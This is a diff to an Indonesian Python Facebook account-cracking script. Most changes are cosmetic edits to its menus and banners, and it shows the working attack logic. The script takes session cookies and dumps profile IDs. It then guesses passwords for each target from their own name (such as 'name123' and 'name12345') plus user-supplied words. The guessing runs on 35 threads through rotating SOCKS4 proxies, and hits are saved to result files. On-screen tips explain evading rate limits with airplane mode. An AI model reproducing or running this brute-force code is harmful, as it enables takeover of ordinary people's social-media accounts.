@@ -277,9 +277,9 @@ def jalan(z):
 
 def mentod():
     print('%s▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\n %sMETHOD MENU%s'%(N,BM,N))
-    print(' %s[%s1%s] Free Facebook (%sfast%s)'%(N,H,N,H,N))
-    print(' [%s2%s] Mbasic Facebook (%sSlow%s)'%(H,N,H,N))
-    print(' [%s3%s] Mobile Facebook (%sSuper Slow%s)'%(H,N,H,N))
+    print(' %s[%s1%s] Free (%sfast%s)'%(N,H,N,H,N))
+    print(' [%s2%s] Mbasic (%sSlow%s)'%(H,N,H,N))
+    print(' [%s3%s] Mobile (%sSuper Slow%s)'%(H,N,H,N))
 
 
 
@@ -398,8 +398,8 @@ def login():
 
 
 def yayanxd():
-    logo()
     os.system('clear')
+    logo()
     try:
     	___kontol___ = input('[|] Masukkan Cookies : ')
     	data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":___kontol___})
@@ -715,7 +715,7 @@ def moch_yayan(my_name,my_id):
 
 
 
-        input(' [%sPRESS ENTER%s] to continue'%(H,N));moch_yayan()
+        input(' [%sPRESS ENTER%s] To Out Tools'%(H,N));exit()
 
 
 
@@ -1787,7 +1787,7 @@ class __crack__:
     def plerr(self,id):
         self.id = id
         print(f'\n %s[%s•%s] Total ID : %s%s%s' %(N,H,N,H,len(self.id),N))
-        ___yayanganteng___ = input('%s\n [%s?%s] Masukan Password Scrip (%sInput%s) : %s'%(N,K,N,H,N,H))
+        ___yayanganteng___ = input('%s\n [%s?%s] Masukan Password Tools (%sInput%s) : %s'%(N,K,N,H,N,H))
         if ___yayanganteng___ in ('Teddy Ganteng', 'Strovmirviaska'):
             self.tampilkan_apk()
             print('%s▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\n %sSETTING MANUAL PASSWORD%s'%(N,BM,N))
@@ -1855,45 +1855,15 @@ class __crack__:
 
 
     def __metode__(self, cebok, user, pasw):
-
-
-
         global ok,cp,loop
-
-
-
         animasi = random.choice(["\x1b[1;91m[?]","\x1b[1;92m[?]","\x1b[1;93m[?]","\x1b[1;94m[?]","\x1b[1;95m[?]","\x1b[1;96m[?]","\x1b[1;97m[?]"])
-
-
-
         sys.stdout.write(f"\r {N}{animasi} {N}{loop}{N}/{M}{len(self.id)} {N}[{H}OK:{len(ok)}{N}][{K}CP:{len(cp)}{N}] [{H}{'{:.1%}'.format(loop/float(len(self.id)))}{N}]")
-
-
-
         sys.stdout.flush()
-
-
-
         try:os.mkdir('results')
-
-
-
         except:pass
-
-
-
         try:
-
-
-
             for pw in pasw:
-
-
-
                 pw = pw.lower()
-
-
-
                 session=requests.Session()
                 nip=random.choice(prox)
                 proxs= {'http': 'socks4://'+nip}
@@ -2157,267 +2127,73 @@ class __crack__:
 
 
     def kombinasi_pw(self,url):
-
-
-
-        print('%s##################################################\n %sPASSWORD MENU%s'%(N,BM,N))
-
-
-
+       os.system('clear')
+       logo()
+        print('%s▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\n %sPASSWORD MENU%s'%(N,BM,N))
         print(' %s[%s1%s] nama,nama123,nama12345'%(N,H,N))
-
-
-
         print(' %s[%s2%s] nama,nama123,nama1234,nama12345'%(N,H,N))
-
-
-
         print(' %s[%s3%s] nama,nama123,nama1234,nama12345,%s+Sandi%s'%(N,H,N,H,N))
-
-
-
         pw = input(f"\n {N}[{K}?{N}] Choose Password Method : ")
-
-
-
         if pw in[""]:
-
-
-
             print(f" {N}[{M}!{N}] Don't be empty");self.kombinasi_pw(url)
-
-
-
         elif pw in["1","01"]:
-
-
-
-            print('%s##################################################\n [%s+%s] OK : results/OK-%s-%s-%s.txt'%(N,H,N,ha, op, ta))
-
-
-
+            print('%s▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\n [%s+%s] OK : results/OK-%s-%s-%s.txt'%(N,H,N,ha, op, ta))
             print(' %s[%s+%s] CP : results/CP-%s-%s-%s.txt'%(N,K,N,ha, op, ta))
-
-
-
-            print('%s##################################################\n [%s!%s] Must activate airplanemode on ID 30\n [%s!%s] Play back airplanemode every 500 ID\n [%s!%s] To stop %sCTRL+c%s on keyboard\n##################################################'%(N,M,N,M,N,M,N,H,N))
-
-
-
+            print('%s▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\n [%s!%s] Aktifkan Mode Pesawat 5 detik jika Terkena Spam \n [%s!%s] Aktifkan Kembali Mode Pesawat Pada DUMP ID Ke 1000\n [%s!%s] CTRL+Z %sPada Keyboard%s Jika Ingin Stop !\n▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄'%(N,M,N,M,N,M,N,H,N))
             with YayanGanteng(max_workers=35) as kirim:
-
-
-
                 for yntkts in self.id:
-
-
-
                    try:
-
-
-
                        uid, name = yntkts.split('<=>')
-
-
-
                        xz = name.split(' ')
-
-
-
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
-
-
-
                            pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345"]
-
-
-
                        else:
-
-
-
                            pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345"]
-
-
-
                        kirim.submit(self.__metode__,url,uid,pwx)
-
-
-
                    except:pass
-
-
-
             hasil(ok,cp)
-
-
 
         elif pw in["2","02"]:
-
-
-
-            print('%s##################################################\n [%s+%s] OK : results/OK-%s-%s-%s.txt'%(N,H,N,ha, op, ta))
-
-
-
+            print('%s▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\n [%s+%s] OK : results/OK-%s-%s-%s.txt'%(N,H,N,ha, op, ta))
             print(' %s[%s+%s] CP : results/CP-%s-%s-%s.txt'%(N,K,N,ha, op, ta))
-
-
-
-            print('%s##################################################\n [%s!%s] Must activate airplanemode on ID 30\n [%s!%s] Play back airplanemode every 500 ID\n [%s!%s] To stop %sCTRL+c%s on keyboard\n##################################################'%(N,M,N,M,N,M,N,H,N))
-
-
-
+            print('%s▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\n [%s!%s] Aktifkan Mode Pesawat 5 detik jika Terkena Spam \n [%s!%s] Aktifkan Kembali Mode Pesawat Pada DUMP ID Ke 1000\n [%s!%s] CTRL+Z %sPada Keyboard%s Jika Ingin Stop !\n▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄'%(N,M,N,M,N,M,N,H,N))
             with YayanGanteng(max_workers=35) as kirim:
-
-
-
                 for yntkts in self.id:
-
-
-
                    try:
-
-
-
                        uid, name = yntkts.split('<=>')
-
-
-
                        xz = name.split(' ')
-
-
-
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
-
-
-
                            pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"12345", xz[0]+xz[1]]
-
-
-
                        else:
-
-
-
                            pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"12345", xz[0]+xz[1]]
-
-
-
                        kirim.submit(self.__metode__,url,uid,pwx)
-
-
-
                    except:pass
-
-
-
             hasil(ok,cp)
-
-
 
         elif pw in["3","03"]:
-
-
-
-            print('%s##################################################\n %sADDITIONAL PASSWORD MENU%s'%(N,BM,N))
-
-
-
-            #print(" %s[%s!%s] Semakin banyak kombinasi password semakin lama proses crack!"%(N,M,N))
-
-
-
+            print('%s▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\n %sADDITIONAL PASSWORD MENU%s'%(N,BM,N))
             print(" %s[%s!%s] Use %sKOMMA%s for separator"%(N,M,N,H,N))
-
-
-
             print(" %s[%s!%s] Example : %ssayang,rahasia,bismillah%s"%(N,M,N,H,N))
-
-
-
             pw = input(f" {N}[{K}?{N}] Enter additional password : {H}").split(",")
-
-
-
-            print('%s##################################################\n [%s+%s] OK : results/OK-%s-%s-%s.txt'%(N,H,N,ha, op, ta))
-
-
-
+            print('%s▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\n [%s+%s] OK : results/OK-%s-%s-%s.txt'%(N,H,N,ha, op, ta))
             print(' %s[%s+%s] CP : results/CP-%s-%s-%s.txt'%(N,K,N,ha, op, ta))
-
-
-
-            print('%s##################################################\n [%s!%s] Must activate airplanemode on ID 30\n [%s!%s] Play back airplanemode every 500 ID\n [%s!%s] To stop %sCTRL+c%s on keyboard\n##################################################'%(N,M,N,M,N,M,N,H,N))
-
-
-
+            print('%s▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\n [%s!%s] Aktifkan Mode Pesawat 5 detik jika Terkena Spam \n [%s!%s] Aktifkan Kembali Mode Pesawat Pada DUMP ID Ke 1000\n [%s!%s] CTRL+Z %sPada Keyboard%s Jika Ingin Stop !\n▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄'%(N,M,N,M,N,M,N,H,N))
             with YayanGanteng(max_workers=35) as kirim:
-
-
-
                 for yntkts in self.id:
-
-
-
                    try:
-
-
-
                        uid, name = yntkts.split('<=>')
-
-
-
                        xz = name.split(' ')
-
-
-
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
-
-
-
                            xxx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"12345", xz[0]+xz[1]]
-
-
-
                            pwx = xxx + pw
-
-
-
                        else:
-
-
-
                            xxx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"12345", xz[0]+xz[1]]
-
-
-
                            pwx = xxx + pw
-
-
-
                        kirim.submit(self.__metode__,url,uid,pwx)
-
-
-
                    except:pass
-
-
-
             hasil(ok,cp)
-
-
-
         else:
-
-
-
             print(f"\n {N}[{M}!{N}] Correct input");self.kombinasi_pw(url)
-
-
-
-
-
 
 
 if __name__ == '__main__':
